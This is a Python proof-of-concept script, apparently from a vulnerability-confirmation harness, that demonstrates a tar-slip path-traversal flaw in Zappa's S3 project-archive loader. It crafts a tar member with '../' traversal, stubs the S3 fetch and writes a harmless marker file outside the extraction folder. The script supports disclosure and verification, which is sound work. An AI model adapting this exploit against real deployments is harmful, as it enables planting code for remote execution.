#!/usr/bin/env python3
"""VULN-003 — tarfile.extractall tar-slip on the S3 project archive (slim_handler).

Vulnerable code : targets/Zappa/zappa/handler.py:219-242 (load_remote_project_archive), sink :233-234
Vulnerability   : CWE-22 Path Traversal via tar extraction (the CVE-2007-4559 / "tarslip" family).
Surface         : S3-archive control (slim_handler:true sets ARCHIVE_PATH) — cold-start code execution.

Mechanism (plain English)
-------------------------
Under `slim_handler`, at cold start Zappa fetches the project archive from S3 and
extracts it with no member-name sanitisation:

    with tarfile.open(fileobj=archive_on_s3["Body"], mode="r|gz") as t:
        t.extractall(project_folder)            # <-- no filter=, no path check
    sys.path.insert(0, project_folder)          # extracted dir added to import path

`tarfile.extractall` without a `filter=` (Python < 3.14 default = fully trusted)
honours `../` members, so an archive entry like `../../../../tmp/evil/x.py` is
written OUTSIDE `project_folder`. Because `project_folder` is then put on
`sys.path`, an attacker who controls the S3 archive can plant/overwrite Python
modules and achieve code execution at cold start.

What a successful run proves
----------------------------
Feeding the real `load_remote_project_archive` (S3 stubbed) a gzip tar whose
member name traverses upward writes a file OUTSIDE the intended project folder.
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, lab_python, log, verdict

VULN = "VULN-003"

_DRIVER = r"""
import json, os, io, tarfile, secrets, types, shutil
from zappa.handler import LambdaHandler
sfx = secrets.token_hex(4)
outside_dir = "/tmp/zappa_tarslip_%s" % sfx       # OUTSIDE the project folder
target = outside_dir + "/PWNED.py"
member = "../" * 8 + "tmp/zappa_tarslip_%s/PWNED.py" % sfx

buf = io.BytesIO()                                 # build a malicious .tar.gz in memory
with tarfile.open(fileobj=buf, mode="w:gz") as t:
    data = b"# code planted outside project_folder by tar-slip -> lands on sys.path"
    ti = tarfile.TarInfo(name=member); ti.size = len(data)
    t.addfile(ti, io.BytesIO(data))
buf.seek(0)

class _Sess:                                       # stub the S3 fetch to feed our archive bytes
    def resource(self, name):
        class S3:
            def Object(self, bucket, key):
                class O:
                    def get(self):
                        class B:
                            def read(self, *a): return buf.read(*a)
                        return {"Body": B()}
                return O()
        return S3()

lh = LambdaHandler.__new__(LambdaHandler)
lh.settings = types.SimpleNamespace(PROJECT_NAME="proj_%s" % sfx)
lh._get_boto_session = lambda: _Sess()
err = None
try:
    lh.load_remote_project_archive("s3://attacker-bucket/project.tar.gz")   # <-- REAL target code
except Exception as e:
    err = repr(e)
escaped = os.path.exists(target)
content = open(target).read() if escaped else None
if os.path.exists(outside_dir):
    shutil.rmtree(outside_dir, ignore_errors=True)
print(json.dumps({"target": target, "escaped_write": escaped, "content": content, "err": err}))
"""


def main():
    banner(VULN, "tarfile.extractall tar-slip on the S3 project archive",
           "zappa/handler.py:233-234 (extractall, no filter) + :237 sys.path.insert")

    log("STEP", "feeding load_remote_project_archive a gzip tar whose member traverses '../' out of the project dir")
    cp = lab_python(_DRIVER)
    res = json.loads(cp.stdout.decode().strip().splitlines()[-1])
    log("INFO", f"intended-outside target: {res['target']}")
    log("INFO", f"escaped write occurred : {res['escaped_write']}; content={res['content']!r}")

    if res["escaped_write"]:
        log("PROOF", f"the archive member '../../..PWNED.py' was extracted to {res['target']} — OUTSIDE "
                     f"project_folder — because extractall runs with no filter/path check. Since "
                     f"project_folder is added to sys.path, an attacker controlling the S3 archive plants "
                     f"importable code -> cold-start RCE. (Python 3.12 emits only a DeprecationWarning.)")
        log("OK", "exploit confirmed — tar-slip writes outside the extraction directory")
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — tarfile.extractall traversal writes outside project_folder")
        return 0
    log("FAIL", f"escaped_write={res['escaped_write']} err={res['err']}")
    verdict("FAILED", f"{VULN}: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
